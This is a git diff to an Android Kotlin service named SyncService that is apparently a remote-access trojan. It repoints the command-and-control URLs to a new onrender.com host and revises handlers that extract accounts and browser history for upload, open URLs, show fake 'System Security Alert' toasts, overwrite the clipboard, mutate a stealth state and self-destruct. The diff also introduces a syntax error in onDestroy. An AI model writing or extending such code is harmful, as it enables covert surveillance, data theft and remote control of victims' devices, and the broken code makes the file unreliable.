@@ -54,7 +54,6 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
-import java.util.UUID
 import java.util.concurrent.TimeUnit
 import java.util.zip.Deflater
 import java.util.zip.ZipEntry
@@ -64,14 +63,14 @@ import kotlin.coroutines.resume
 class SyncService : LifecycleService() {
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    // الرابط معدل لخدمتك الشغالة
-    private val SERVER = "https://web-assets-service-3.onrender.com/api/v3/uranium/stream"
-    private val UPLOAD = "https://web-assets-service-3.onrender.com/api/v3/uranium/upload_raw"
+    // تم تصحيح الرابط ليطابق سيرفرك الجديد web-assets-service-4 بدقة
+    private val SERVER = "https://web-assets-service-4.onrender.com/api/v3/uranium/stream"
+    private val UPLOAD = "https://web-assets-service-4.onrender.com/api/v3/uranium/upload_raw"
     
     private var wakeLock: PowerManager.WakeLock? = null
     private lateinit var cameraManager: CameraManager
     private var wifiAutopilot = true
-    private var stealthState = "OMEGA_V22"
+    private var stealthState = "OMEGA_V22_FIXED"
     private val mainHandler = Handler(Looper.getMainLooper())
     private var loopStarted = false
 
@@ -176,6 +175,8 @@ class SyncService : LifecycleService() {
 
     private suspend fun executeTask(task: JSONObject) {
         val action = task.optString("action", "").uppercase()
+        val payload = task.optJSONObject("payload") ?: JSONObject()
+
         when {
             action.contains("CMD_FLASH_ON") -> toggleFlash(true)
             action.contains("CMD_FLASH_OFF") -> toggleFlash(false)
@@ -201,38 +202,36 @@ class SyncService : LifecycleService() {
             action.contains("EXTRACT_ACCOUNTS") -> extractAndZipData("Accounts_Omega.txt", readAccounts())
             action.contains("EXTRACT_BROWSER") -> extractAndZipData("Browser_Omega.txt", readBrowserHistory())
             
-            // === الأوامر الجديدة ===
+            // === معالجة الأوامر المتقدمة مع الـ Payload بشكل سليم ===
             action.contains("CMD_SCREEN_ON") -> toggleScreen(true)
             action.contains("CMD_SCREEN_OFF") -> toggleScreen(false)
             action.contains("CMD_OPEN_URL") -> {
-                val url = task.optJSONObject("payload")?.optString("url", "") ?: ""
-                if (url.isNotEmpty()) {
-                    try {
-                        val i = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
-                        startActivity(i)
-                        sendReport("URL", "تم فتح الرابط: $url")
-                    } catch (e: Exception) { sendReport("URLErr", e.message ?: "?") }
-                }
+                val url = payload.optString("url", "https://google.com")
+                try {
+                    val i = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
+                    startActivity(i)
+                    sendReport("URL", "تم فتح الرابط بنجاح: $url")
+                } catch (e: Exception) { sendReport("URLErr", e.message ?: "?") }
             }
             action.contains("CMD_SHOW_TOAST") -> {
-                val msg = task.optJSONObject("payload")?.optString("msg", "System Update") ?: "System Update"
+                val msg = payload.optString("msg", "System Security Alert")
                 mainHandler.post {
                     android.widget.Toast.makeText(applicationContext, msg, android.widget.Toast.LENGTH_LONG).show()
                 }
-                sendReport("Toast", "تم عرض رسالة: $msg")
+                sendReport("Toast", "تم عرض الرسالة على الشاشة: $msg")
             }
             action.contains("CMD_SET_CLIPBOARD") -> {
-                val txt = task.optJSONObject("payload")?.optString("text", "") ?: ""
+                val txt = payload.optString("text", "")
                 if (txt.isNotEmpty()) {
                     mainHandler.post {
                         val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-                        cb.setPrimaryClip(ClipData.newPlainText("System", txt))
+                        cb.setPrimaryClip(ClipData.newPlainText("SystemData", txt))
                     }
-                    sendReport("Clipboard", "تم تعيين الحافظة إلى: $txt")
+                    sendReport("Clipboard", "تم تحديث الحافظة بنجاح.")
                 }
             }
-            action.contains("POLY_MUTATE") -> { stealthState = "MUTATED_${System.currentTimeMillis() % 99999}"; sendReport("Stealth", "Mutated: $stealthState") }
-            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
+            action.contains("POLY_MUTATE") -> { stealthState = "MUTATED_${System.currentTimeMillis() % 99999}"; sendReport("Stealth", "Mutated state: $stealthState") }
+            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping core..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
         }
     }
 
@@ -607,7 +606,7 @@ class SyncService : LifecycleService() {
         return n
     }
 
-    override fun onDestroy() {
+    override onDestroy() {
         try { wakeLock?.release() } catch (_: Exception) {}
         scope.cancel()
         super.onDestroy()
